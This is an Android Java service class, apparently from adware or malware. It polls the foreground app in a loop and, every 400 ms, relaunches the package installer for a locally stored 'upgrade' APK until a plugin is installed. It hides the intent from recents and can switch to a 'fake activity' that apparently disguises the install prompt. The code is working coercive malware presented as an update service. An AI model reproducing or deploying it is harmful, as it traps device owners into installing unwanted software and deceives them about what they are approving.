package com.xstd.qm.service;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import android.text.TextUtils;
import com.xstd.qm.AppRuntime;
import com.xstd.qm.Config;
import com.xstd.qm.Utils;
import com.xstd.qm.setting.SettingManager;

import java.io.File;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-29
 * Time: PM5:52
 * To change this template use File | Settings | File Templates.
 */
public class WatchingService extends Service {

    private Thread mWatchingThread;

    @Override
    public void onCreate() {
        super.onCreate();

        AppRuntime.WATCHING_SERVICE_RUNNING.set(true);
        AppRuntime.WATCHING_SERVICE_BREAK.set(false);

        final ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        mWatchingThread = new Thread(new Runnable() {
            @Override
            public void run() {
                String local = SettingManager.getInstance().getLocalApkPath();
                if (TextUtils.isEmpty(local)) return;

                while (!AppRuntime.WATCHING_SERVICE_BREAK.get()) {
                    String packname = am.getRunningTasks(1).get(0).topActivity.getPackageName();
                    if (!"com.android.packageinstaller".equals(packname)) {
                        AppRuntime.INSTALL_PACKAGE_TOP_SHOW.set(false);

                        if (!AppRuntime.PLUGIN_INSTALLED) {
                            if (!Config.BUTTON_CHANGED_ENABLE) {
                                Intent i = new Intent(Intent.ACTION_VIEW);
                                File upgradeFile = new File(local);
                                i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
                                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                startActivity(i);
                            } else {
                                Utils.startFakeActivity(getApplicationContext(), local);
                            }

                            try {
                                Thread.sleep(400);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    } else {
                        AppRuntime.INSTALL_PACKAGE_TOP_SHOW.set(true);
                    }
                }

                stopSelf();
            }
        });

        mWatchingThread.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        AppRuntime.WATCHING_SERVICE_RUNNING.set(false);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
